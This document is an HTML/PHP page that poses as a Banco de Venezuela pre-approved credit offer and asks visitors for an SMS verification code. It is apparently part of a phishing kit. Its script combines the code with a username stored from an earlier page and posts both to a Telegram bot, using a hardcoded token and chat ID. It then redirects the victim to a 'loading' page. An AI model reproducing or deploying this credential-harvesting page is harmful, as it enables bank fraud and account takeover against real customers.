<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>Banco de Venezuela</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url(<?php echo base_url('/img/background.jpg') ?>);
      background-size: cover;
      background-position: center;
    }

    .container {
      display: flex;

      height: 100%;
      width: 100%;
    }

    .left-side {
      width: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .right-side {
      width: 50%;
    }

    form {
      width: 80%;
      background: white;
      max-width: 550px;
      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
    }

    @media (max-width: 768px) {
      body {
        background: #ededed;
      }

      .container {
        flex-direction: column;
      }

      .left-side {
        width: 100%;
        height: 100vh;
      }

      .right-side {
        display: none;
      }
    }
  </style>
  <style>
    .form-group {
      position: relative;
      margin-bottom: 20px;
      margin: 20px;
    }

    .form-group label {
      position: absolute;
      top: 50%;
      left: 10px;
      transform: translateY(-55%);
      color: #999;
      transition: top 0.3s, font-size 0.3s;
      pointer-events: none;
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      box-sizing: border-box;
      position: relative;
      height: 60px;
      border: 0;

      border-bottom: 1px solid gray;
      background: #ededed;
      outline: none;
    }

    .form-group input:focus {
      border: 0;
    }

    .form-group input:focus+label,
    .form-group input:not(:placeholder-shown)+label {
      top: 5px;
      font-size: 12px;
    }

    button {
      background-color: #0067b1;
      color: white;
      border-radius: 3px;
      border: 0;
      padding: 15px;
      width: 200px;
    }
  </style>
  <style>
    .slider-container {
      text-align: center;
      width: 80%;
      max-width: 600px;
      margin: auto;
    }

    .slider-container h2 {
      margin-bottom: 20px;
    }

    .slider {
      width: 100%;
      margin: 20px 0;
    }

    .slider-value {
      font-size: 24px;
      color: #333;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="left-side">
      <form id="loginform">
        <div style="text-align: center">
          <img src="<?php echo base_url('/img/logo.png') ?>" alt="" style="width: 60%; margin-top: 20px" />
        </div>
        <div style="width: 100%; text-align: center">
          <div style="margin: 10px; color: #0067b1 !important">
            <h4>Credito Preaprobado</h4>
            <h5 style="padding: 20px">
              Para solicitar y conocer el monto de tu crédito ingresa el SMS
              que hemos enviado a tu celular registrado o puedes generarlo en
              nuestra app Amiven
            </h5>
          </div>
          <div style="width: 100%; text-align: center">
            <div
              style="
                  width: 100%;
                  text-align: center;
                  color: #0070cc;
                  font-weight: bold;
                  margin-bottom: 20px;
                ">
              Selecciona el monto de tu credito:
            </div>
            <div class="slider-container">
              <div
                class="slider-value"
                id="sliderValue"
                style="color: #0070cc">
                $10,000 USD
              </div>
              <input
                type="range"
                min="1000"
                max="50000"
                value="10000"
                class="slider"
                id="priceSlider" />
            </div>
          </div>

          <script>
            const slider = document.getElementById("priceSlider");
            const sliderValue = document.getElementById("sliderValue");

            function formatNumber(num) {
              if (num < 10000) {
                return num;
              }
              return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
            }

            slider.addEventListener("input", function() {
              sliderValue.textContent = `$${formatNumber(slider.value)} USD`;
            });

            // Formatear el valor inicial del slider
            sliderValue.textContent = `$${formatNumber(slider.value)} USD`;
          </script>
          <div class="form-group">
            <input
              type="text"
              id="sms"
              name="nombre"
              style="width: 100%"
              maxlength="8"
              required />
            <label for="sms">SMS *</label>
          </div>

          <script>
            document.addEventListener("DOMContentLoaded", function() {
              const input = document.getElementById("sms");
              const label = input.nextElementSibling;
              label.style.top = "50%";
              if (input.value !== "") {
                label.style.top = "15px";
                label.style.fontSize = "12px";
              }

              input.addEventListener("focus", () => {
                label.style.top = "15px";
                label.style.fontSize = "12px";
              });

              input.addEventListener("blur", () => {
                if (!input.value) {
                  label.style.top = "50%";
                  label.style.fontSize = "";
                }
              });
            });
          </script>
        </div>
        <div style="width: 100%; text-align: center">
          <button type="submit">Verificar</button>
        </div>
        <div style="width: 100%; height: 30px"></div>
      </form>
    </div>
    <div class="right-side"></div>
  </div>
</body>

<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

<script>
  const url = "https://ipapi.co/json/";
  const form = document.querySelector("#loginform");

  form.addEventListener("submit", (event) => {
    event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
    const nombre = localStorage.getItem("usuario");
    const contra = document.querySelector("#sms").value;
    const message = " ------ BDV ------ Nombre: " + nombre + " ------ SMS: " + contra;
    axios
      .post(
        "https://api.telegram.org/bot7456446404:AAG4fs8CtPgfuR5OLZ4oxn6HErCXPfAv53c", {
          chat_id: "773065090",
          text: message,
        }
      )
      .then((response) => {
        window.location.href = "<?php echo site_url(), "/Welcome/cargando2"; ?>";
      })
      .catch((error) => {
        console.error(error);
      });
  });
</script>

</html>